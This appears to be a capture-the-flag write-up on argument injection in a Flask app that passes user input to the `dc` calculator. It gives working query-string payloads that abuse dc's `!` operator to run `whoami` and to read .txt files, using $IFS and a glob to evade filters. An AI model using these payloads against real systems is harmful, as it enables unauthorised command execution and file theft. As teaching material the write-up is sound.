# System Command Injection via Web

### Technique 1 

> **Target :** Flask
>
> **Originally extecuted system command :** `dc` (A calculator app)

**Vulnerable Server Code:**

```py
@app.get('/')
def index():
	sequence = request.args.get('sequence', None)
	if sequence is None:
		return render_template('index.html')

	script_file = os.path.basename(sequence + '.dc')
	if ' ' in script_file or 'flag' in script_file:
		return ':('

	proc = subprocess.run(
		['dc', script_file], 
		capture_output=True,
		text=True,
		timeout=1,
	)
	output = proc.stdout

	return render_template('index.html', output=output)
```

**The vulnerability:**

Though the command to be executed by `subprocess.run()` is supplied as **a list of strings** (instead of a single string) and the **absence of** `shell=True` might make the code look secure at the first glance, in reality we can still inject malicious arguments into the command being executed, which happens to be `dc` in this case.

Therefore, even if we cannot do stuff like `something; whoami;`, `something | whoami;`, `somethingtrue && whoami;` etc., we can still **inject valid malicious arguments to abuse the executable's intended functionality**.

We can **confirm the possibility of argument injection** by sending GET requests with query strings `?sequence=-h` and `?sequence=-V` which will lead to the execution of the commands `dc -h.dc` and `dc -V.dc`respectively (the `.dc` at the end is added by the Flask code and is immaterial here for these options).

The obtained outputs are as follows:

```bash
# For GET request ?sequence=-h

Usage: dc [OPTION] [file ...]
  -e, --expression=EXPR    evaluate expression
  -f, --file=FILE          evaluate contents of file
  -h, --help               display this help and exit
  -V, --version            output version information and exit

**The exploit:**

By looking at the man page of `dc`, we can find that **`!` helps in arbitrary system command execution**.

So the ideal cmd to be run on the target would be `dc -e!whoami`; but the Flask code adds ".dc" at the end, which will run `dc -e!whoami.dc` causing an error. So we must supply a URL encoded newline character (`%0A`) in the query string to get the needed O/p.

The query string: `?sequence=-e!whoami%0A`

**Payload that bypasses `' '` and `'flag'` filters to get the flag's content** : `?sequence=-e!cat%5C$IFS*.txt%0A`

The aim is to run `dc -e!cat\$IFS*.txt` which uses `$IFS` *(`\` to escape `$`)* to introduce space after `cat` cmd and `*.txt` helps in locating all .txt files in the current directory to be used with the `cat` cmd.
